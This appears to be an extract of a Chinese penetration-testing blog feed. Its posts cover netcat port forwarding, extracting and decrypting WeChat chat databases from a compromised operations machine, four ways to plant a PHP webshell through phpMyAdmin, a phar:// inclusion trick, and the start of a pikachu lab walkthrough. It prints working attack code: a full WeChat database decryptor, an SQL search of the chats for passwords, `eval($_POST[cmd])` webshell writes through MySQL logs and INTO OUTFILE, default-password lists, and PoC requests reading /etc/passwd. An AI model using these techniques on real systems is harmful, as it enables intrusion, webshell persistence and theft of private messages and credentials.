<p><img src="/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/c001fa0a9ba41c99f2785e7cbb821b41.jpeg" alt="c001fa0a9ba41c99f2785e7cbb821b41.jpeg"></p>
<p>​    远程端口转发，访问kali的7777端口，就是访问centos的22端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lp 7777 -c &quot;nc 192.168.199.236 22&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/0bee3204916dd3b027b3d0e5b2f921ce.jpeg" alt="0bee3204916dd3b027b3d0e5b2f921ce.jpeg"></p>
]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>pc端微信个人信息与聊天记录取证</title>
    <url>/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h1 id="pc端微信个人信息与聊天记录取证"><a href="#pc端微信个人信息与聊天记录取证" class="headerlink" title="pc端微信个人信息与聊天记录取证"></a>pc端微信个人信息与聊天记录取证</h1><p>有些时候拿下了运维机，可以尝试拿下聊天记录，这样就可以找到一些机器的密码和敏感信息。</p>
<h1 id="数据库密钥"><a href="#数据库密钥" class="headerlink" title="数据库密钥"></a>数据库密钥</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/AdminTest0/SharpWxDump</span><br></pre></td></tr></table></figure>

<p>用这个工具即可，提取当前电脑的一些微信客户端的信息</p>
<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132133712.png" alt="image-20230419132133712"></p>
<p>而且每个微信客户端对应的偏移值是不一样的，所以就必须要作者不定期的更新每个版本的偏移值，以后我们自己有时间了自己研究研究也可以进行相关的更新。</p>
<h1 id="聊天记录解密"><a href="#聊天记录解密" class="headerlink" title="聊天记录解密"></a>聊天记录解密</h1><p>现在就是拿到数据库密钥之后，对本地的聊天记录进行获取就可以了</p>
<p>wxid_xxxxxxxx一般都在文档目录下，作为存储目录，下载对应的聊天记录文件到本地</p>
<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132505478.png" alt="image-20230419132505478"></p>
<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132522796.png" alt="image-20230419132522796"></p>
<p>关于聊天记录文件：MSG.db，超出240MB会自动生成MSG1.db，以此类推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG0.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG1.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\Multi\MSG2.db &gt; 聊天记录</span><br><span class="line">wxid_xxxxxxxx\Msg\MicroMsg.db &gt; Contact字段 &gt; 好友列表</span><br><span class="line">wxid_xxxxxxxx\Msg\MediaMsg.db &gt; 语音 &gt; 格式为silk</span><br></pre></td></tr></table></figure>

<p>然后用最后的解密代码对聊天记录文件进行解密</p>
<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419132952952.png" alt="image-20230419132952952"></p>
<p>解密成功。</p>
<p>将解密后的MSG0.db拖入数据库工具，查询语句查找关键字：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> &quot;MSG&quot; <span class="keyword">WHERE</span> StrContent  <span class="keyword">like</span><span class="string">&#x27;%密码%&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/04/19/pc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%8F%96%E8%AF%81/image-20230419133743583.png" alt="image-20230419133743583"></p>
<h1 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, ctypes, sys, getopt</span><br><span class="line"></span><br><span class="line">SQLITE_FILE_HEADER = <span class="built_in">bytes</span>(<span class="string">&#x27;SQLite format 3&#x27;</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>) + <span class="built_in">bytes</span>(<span class="number">1</span>)</span><br><span class="line">IV_SIZE = <span class="number">16</span></span><br><span class="line">HMAC_SHA1_SIZE = <span class="number">20</span></span><br><span class="line">KEY_SIZE = <span class="number">32</span></span><br><span class="line">DEFAULT_PAGESIZE = <span class="number">4096</span></span><br><span class="line">DEFAULT_ITER = <span class="number">64000</span></span><br><span class="line">opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&#x27;hk:d:&#x27;</span>)</span><br><span class="line">input_pass = <span class="string">&#x27;&#x27;</span></span><br><span class="line">input_dir = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> op, value <span class="keyword">in</span> opts:</span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&#x27;-k&#x27;</span>:</span><br><span class="line">        input_pass = value</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">            input_dir = value</span><br><span class="line"></span><br><span class="line">password = <span class="built_in">bytes</span>.fromhex(input_pass.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_dir, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">    blist = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(blist))</span><br><span class="line">salt = blist[:<span class="number">16</span>]</span><br><span class="line">key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password, salt, DEFAULT_ITER, KEY_SIZE)</span><br><span class="line">first = blist[<span class="number">16</span>:DEFAULT_PAGESIZE]</span><br><span class="line">mac_salt = <span class="built_in">bytes</span>([x ^ <span class="number">58</span> <span class="keyword">for</span> x <span class="keyword">in</span> salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, key, mac_salt, <span class="number">2</span>, KEY_SIZE)</span><br><span class="line">hash_mac = hmac.new(mac_key, digestmod=<span class="string">&#x27;sha1&#x27;</span>)</span><br><span class="line">hash_mac.update(first[:-<span class="number">32</span>])</span><br><span class="line">hash_mac.update(<span class="built_in">bytes</span>(ctypes.c_int(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hash_mac.digest() == first[-<span class="number">32</span>:-<span class="number">12</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Decryption Success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Password Error&#x27;</span>)</span><br><span class="line">blist = [blist[i:i + DEFAULT_PAGESIZE] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DEFAULT_PAGESIZE, <span class="built_in">len</span>(blist), DEFAULT_PAGESIZE)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_dir, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">    f.write(SQLITE_FILE_HEADER)</span><br><span class="line">    t = AES.new(key, AES.MODE_CBC, first[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">    f.write(t.decrypt(first[:-<span class="number">48</span>]))</span><br><span class="line">    f.write(first[-<span class="number">48</span>:])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blist:</span><br><span class="line">        t = AES.new(key, AES.MODE_CBC, i[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">        f.write(t.decrypt(i[:-<span class="number">48</span>]))</span><br><span class="line">        f.write(i[-<span class="number">48</span>:])</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 .\Decode.py -k 数据库密钥 -d .\MSG0.db</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>phpmyadmin后台拿shell的4种方式</title>
    <url>/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="phpmyadmin后台拿shell的4种方式"><a href="#phpmyadmin后台拿shell的4种方式" class="headerlink" title="phpmyadmin后台拿shell的4种方式"></a>phpmyadmin后台拿shell的4种方式</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">怎么进phpmyadmin？</span><br><span class="line">弱口令</span><br><span class="line">root/root</span><br><span class="line">root/空密码</span><br><span class="line">root/123456</span><br><span class="line">phpMyAdmin爆破工具</span><br><span class="line">信息泄露(配置文件等)</span><br><span class="line">怎么拿到网站绝对路径？</span><br><span class="line">单引号爆绝对路径</span><br><span class="line">xx.asp?id=1’</span><br><span class="line">错误参数值爆绝对路径</span><br><span class="line">xx.asp?id=-1</span><br><span class="line">搜索引擎搜索绝对路径</span><br><span class="line">site:xxx.com error</span><br><span class="line">site:xxx.com warning</span><br><span class="line">site:xxx.com fatal error</span><br><span class="line">测试文件获取绝对路径</span><br><span class="line">phpinfo.php</span><br><span class="line">test.php</span><br><span class="line">ceshi.php</span><br><span class="line">info.php</span><br><span class="line">php_info.php</span><br></pre></td></tr></table></figure>

<h1 id="全局日志文件写入shell"><a href="#全局日志文件写入shell" class="headerlink" title="全局日志文件写入shell"></a>全局日志文件写入shell</h1><p>首先查看mysql的日志状态，默认是关闭的，因为这个日志的量非常大对资源是一个比较大的开销</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>

<p>general_log_file为日志保存的位置</p>
<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812143953158.png" alt="image-20220812143953158"></p>
<p>随后开启general_log模式</p>
<p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在C:\phpStudy\MySQL\data\stu1.log的文件中，其实就是我们常说的日志文件利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用</p>
<p>这里注意：在修改log路径前，源路径一定要提前记录下来，我们获取shell后还要恢复原来的路径</p>
<p>思路就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = on;  #开全局日志</span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\shell.php&#x27;;   #改日志目录为shell</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;  #写入木马</span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;;</span><br><span class="line">set global general_log = off;把日志目录改回来</span><br></pre></td></tr></table></figure>

<p>记录下原本的日志文件C:\phpStudy\MySQL\data\stu1.log</p>
<p>成功改过来</p>
<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812144956148.png" alt="image-20220812144956148"></p>
<p>写入shell</p>
<p>可以看到服务器上面已经有shell了</p>
<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812145248577.png" alt="image-20220812145248577"></p>
<p>这里写错地方了，应该写到网站目录上面。</p>
<p>菜刀连接，最后把设置调回去，拿下shell！</p>
<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812150008465.png" alt="image-20220812150008465"></p>
<h1 id="在知道绝对路径的情况下，利用INTO-OUTFILE"><a href="#在知道绝对路径的情况下，利用INTO-OUTFILE" class="headerlink" title="在知道绝对路径的情况下，利用INTO OUTFILE"></a><strong>在知道绝对路径的情况下，利用INTO OUTFILE</strong></h1><p><code>select @@basedir;</code> 查找绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>

<p>NULL 不允许导入或导出<br>/tmp 只允许在 /tmp 目录导入导出<br>空 不限制目录</p>
<p>如果有权限<br><code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;INTO OUTFILE &#39;E:/phpstudy_pro/WWW/test.php&#39;</code></p>
<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812142059560.png" alt="image-20220812142059560"></p>
<p>高版本的mysql中，默认为NULL</p>
<h1 id="慢查询写入webshell"><a href="#慢查询写入webshell" class="headerlink" title="慢查询写入webshell"></a>慢查询写入webshell</h1><p>在实际写webshell的时候，我们经常会遭受到secure_file_priv的阻拦，secure_file_priv这个配置参数用来限制load data、outfile、load_file()的使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解决办法：</span><br><span class="line"></span><br><span class="line">在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv=</span><br><span class="line"></span><br><span class="line">在linux下可在/etc/my.cnf的[mysqld]里面，添加secure_file_priv=</span><br></pre></td></tr></table></figure>

<p>通过慢日志查询来绕过此限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、show variables like &#x27;%slow_query_log%&#x27;;                                            查看慢查询日志开启情况</span><br><span class="line"></span><br><span class="line">2、set global slow_query_log=on;                                                             开启慢查询日志</span><br><span class="line"></span><br><span class="line">3、set global slow_query_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;;          修改日志文件存储的绝对路径</span><br><span class="line"></span><br><span class="line">4、select &#x27;&lt;?php @eval($_POST[shell]);?&gt;&#x27; or sleep(10);                         向日志文件中写入shell</span><br><span class="line"></span><br><span class="line">5、使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：</span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;   </span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220813101414308.png" alt="image-20220813101414308"></p>
<p>可以看到服务器上shell已经进去了</p>
<p>菜刀连接一下</p>
<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220813101944718.png" alt="image-20220813101944718"></p>
<h1 id="创建数据库和表写入webshell"><a href="#创建数据库和表写入webshell" class="headerlink" title="创建数据库和表写入webshell"></a>创建数据库和表写入webshell</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件：Root数据库用户（root权限）; 网站绝对路径（确定有写入权限）; secure_file_priv没有具体值。操作步骤：1）执行下面的sql语句，创建表并在表中写入一句话木马，在导出到网站的根路径。</span><br><span class="line">CREATE TABLE test( id text(500) not null);    </span><br><span class="line"></span><br><span class="line">INSERT INTO test (id) VALUES(&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);    </span><br><span class="line"></span><br><span class="line">SELECT id FROM test INTO OUTFILE &#x27;C:/phpstudy/WWW/1.php&#x27;；    </span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS test；</span><br></pre></td></tr></table></figure>

<h1 id="phpMyAdmin漏洞利用："><a href="#phpMyAdmin漏洞利用：" class="headerlink" title="phpMyAdmin漏洞利用："></a>phpMyAdmin漏洞利用：</h1><h2 id="phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）"><a href="#phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）" class="headerlink" title="phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）"></a>phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）</h2><p>影响phpMyAdmin 2.x版本，poc如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /scripts/setup.php HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 80</span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2016-5734-RCE："><a href="#CVE-2016-5734-RCE：" class="headerlink" title="CVE-2016-5734 RCE："></a>CVE-2016-5734 RCE：</h2><p>利用条件：</p>
<blockquote>
<p>1、授权用户；<br>2、phpmyadmin4.3.0-4.6.2 ；<br>3、PHP 4.3.0-5.4.6</p>
</blockquote>
<p>主要原因由于将用户输入的信息拼接进preg_replace函数第一个参数中，而在PHP5.4.7以前，preg_replace存在漏洞，可以0进行截断，并将正则模式修改为e，进而执行命令。</p>
<p>在Kali中有自带的EXP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit phpmyadmin</span><br><span class="line">python3 40185.py -u root - root -d test -c &quot;system(whoami)&quot; http://192.168.75.130:8080/</span><br></pre></td></tr></table></figure>



<p>具体请参考：<a href="https://www.jianshu.com/p/8e44cb1b5b5b">https://www.jianshu.com/p/8e44cb1b5b5b</a></p>
<h2 id="CVE-2018-12613文件包含"><a href="#CVE-2018-12613文件包含" class="headerlink" title="CVE-2018-12613文件包含:"></a>CVE-2018-12613文件包含:</h2><p>利用条件：</p>
<blockquote>
<p>漏洞版本：phpMyAdmin 4.8.0和4.8.1<br>主要原因在index.php中存在一处文件包含逻辑</p>
</blockquote>
<p>满足以下5个条件:</p>
<blockquote>
<p>1、不为空　　<br>2、字符串　　<br>3、不以index开头　　<br>4、不在$target_blacklist这个黑名单中　　<br>5、Core::checkPageValidity()函数为TRUE<br>进而通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
</blockquote>
<p>判断是否存在漏洞经过二次编码绕过<br>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</p>
<p>然后在sql语句中执行一些语句记录到日志，然后在包含即可<br>SELECT ‘‘;<br>查询phpmyadmin cookie值(开发者工具查看)<br><a href="https://links.jianshu.com/go?to=http://192.168.75.130:8080/index.php?target=db_sql.php?/../../../../../../tmp/sess_ff16b4962b5343089c8fcd4c58df53ba">http://192.168.75.130:8080/index.php?target=db_sql.php%253f/../../../../../../tmp/sess_ff16b4962b5343089c8fcd4c58df53ba</a></p>
<h2 id="CVE-2014-8959：本地文件包含"><a href="#CVE-2014-8959：本地文件包含" class="headerlink" title="CVE-2014 -8959：本地文件包含"></a>CVE-2014 -8959：本地文件包含</h2><p>利用条件：</p>
<blockquote>
<p>phpMyAdmin 4 .0.1–4 .2.12<br>PHP version &lt; 5.3.4</p>
</blockquote>
<p>POC:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/gis_data_editor.php?token=你的token值&amp;gis_data[gis_type]=</span><br><span class="line">/../../../../phpinfo.txt%00</span><br></pre></td></tr></table></figure>

<p>在实际利用中可以利用写入文件到/tmp目录下结合此漏洞完成RCE，php版本可以通过http header、导出表内容到文件的附加内容看到。</p>
<h2 id="CVE-2013-3238"><a href="#CVE-2013-3238" class="headerlink" title="CVE-2013-3238:"></a>CVE-2013-3238:</h2><p>利用条件：</p>
<blockquote>
<p>phpMyAdmin 3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3</p>
</blockquote>
<p>msf有相应的利用模块：<br>exploit/multi/http/phpmyadmin_preg_replace</p>
<h2 id="CVE-2012-5159"><a href="#CVE-2012-5159" class="headerlink" title="CVE-2012-5159:"></a>CVE-2012-5159:</h2><p>利用条件：</p>
<blockquote>
<p>phpMyAdmin v3.5.2.2</p>
</blockquote>
<p>msf有相应的利用模块：<br>exploit/multi/http/phpmyadmin_3522_backdoor</p>
<h2 id="CVE-2009-1151"><a href="#CVE-2009-1151" class="headerlink" title="CVE-2009-1151:"></a>CVE-2009-1151:</h2><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>利用条件：</p>
<blockquote>
<p>phpmyadmin 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p>
</blockquote>
<p>msf有相应的利用模块：<br>exploit/unix/webapp/phpmyadmin_config</p>
<p>弱口令&amp;万能密码:<br>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码<br>万能密码：版本2.11.3 / 2.11.4，用户名’localhost’@‘@”则登录成功</p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>php审计之phar://协议</title>
    <url>/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php审计之phar-协议"><a href="#php审计之phar-协议" class="headerlink" title="php审计之phar://协议"></a>php审计之phar://协议</h1><p>之前在网上看到这么个协议，感觉记忆有点模糊，故复现一下。</p>
<ul>
<li>php.ini中的phar.readonly设置为Off（默认为On）</li>
</ul>
<p>一般来说此协议可适用于文件包含</p>
<p>这个协议就是用来读取压缩包中的文件内容的。</p>
<p>我们这里用最最经典的pikachu靶场来做实验。</p>
<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709210835154.png" alt="image-20230709210835154"></p>
<p>看代码，直接包含了get方法接收到的filename参数，我们这里去给include里面加一个压缩包，压缩包里面弄一个shell。</p>
<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709211004093.png" alt="image-20230709211004093"></p>
<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709211049372.png" alt="image-20230709211049372"></p>
<p>现在我们去包含这个1.zip</p>
<p>可以看到直接包含也只能看到里面的文件名字</p>
<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230709211136275.png" alt="image-20230709211136275"></p>
<p>但是我们使用，<code>phar://</code>协议去包含的话（中途改了下代码）</p>
<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230710174430954.png" alt="image-20230710174430954"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://C:\code\phpstudy_pro\WWW\vul\fileinclude\include\12.zip\12.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/10/php%E5%AE%A1%E8%AE%A1%E4%B9%8Bphar-%E5%8D%8F%E8%AE%AE/image-20230710174201307.png" alt="image-20230710174201307"></p>
<p>而且后缀也不是非要zip，换成png也可以，这样就可以绕过了。</p>
<h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>同时也可以用php脚本打包一个phar文件，下面是脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pharFilename</span> = <span class="string">&#x27;myapp.phar&#x27;</span>;</span><br><span class="line"><span class="variable">$entrypoint</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;STUB</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">Phar::mapPhar(&#x27;<span class="subst">$pharFilename</span>&#x27;);</span></span><br><span class="line"><span class="string">include &#x27;phar://<span class="subst">$pharFilename</span>/<span class="subst">$entrypoint</span>&#x27;;</span></span><br><span class="line"><span class="string">__HALT_COMPILER();</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="variable">$pharFilename</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加入口文件</span></span><br><span class="line"><span class="variable">$phpCode</span> = <span class="string">&#x27;&lt;?php echo &quot;Hello, World!&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="variable">$entrypoint</span>, <span class="variable">$phpCode</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 stub（入口文件）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="variable">$stub</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;成功生成 <span class="subst">$pharFilename</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>phpcode就是包含的文件内容。</p>
<p>ps:我用php7.3.4版本复现了一晚上都没成功，真要自杀了。换成5.6.9就可以了。</p>
]]></content>
      <categories>
        <category>-daima</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场通关</title>
    <url>/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
    <content><![CDATA[<h1 id="pikachu靶场通关"><a href="#pikachu靶场通关" class="headerlink" title="pikachu靶场通关"></a>pikachu靶场通关</h1><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="1-基于表单的暴力破解"><a href="#1-基于表单的暴力破解" class="headerlink" title="1.基于表单的暴力破解"></a>1.基于表单的暴力破解</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220131122217344.png" alt="image-20220131122217344"></p>
<p>burp跑一下</p>
<h2 id="2-验证码绕过-on-server"><a href="#2-验证码绕过-on-server" class="headerlink" title="2.验证码绕过(on server)"></a>2.验证码绕过(on server)</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220131122833233.png" alt="image-20220131122833233"></p>
<p>修改密码发了两次包都发现没有提示验证码错误，那我们可以重复利用这个验证码。</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220131123001877.png" alt="image-20220131123001877"></p>
<p>跑出来了</p>
<h2 id="3-验证码绕过-on-client"><a href="#3-验证码绕过-on-client" class="headerlink" title="3.验证码绕过(on client)"></a>3.验证码绕过(on client)</h2><p>根据题目提示是前端验证码</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220131123458283.png" alt="image-20220131123458283"></p>
<p>那我们发包同样可以绕过</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220131123626609.png" alt="image-20220131123626609"></p>
<p>成功</p>
<h2 id="4-token防爆破"><a href="#4-token防爆破" class="headerlink" title="4.token防爆破?"></a>4.token防爆破?</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220131124113085.png" alt="image-20220131124113085"></p>
<p>通过观察我们可以发现下一次的token是由这一次的返回包来决定的，</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201102136091.png" alt="image-20220201102136091"></p>
<p>选这个</p>
